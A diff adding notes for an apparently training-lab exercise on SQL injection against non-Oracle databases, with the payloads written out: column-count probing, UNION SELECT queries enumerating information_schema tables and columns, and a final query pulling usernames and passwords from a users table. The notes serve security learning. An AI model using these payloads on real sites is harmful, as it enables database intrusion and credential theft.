@@ -40,4 +40,17 @@ administrator'--
   ```sh
   union select 1,@@version#
   ```
+### Lab5: SQL injection attack, listing the database contents on non-Oracle databases
 
+  ```sh
+  order by 2#
+  ```
+  ```sh
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+  ```
+  ```sh
+'+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+  ```
+  ```sh
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+  ```
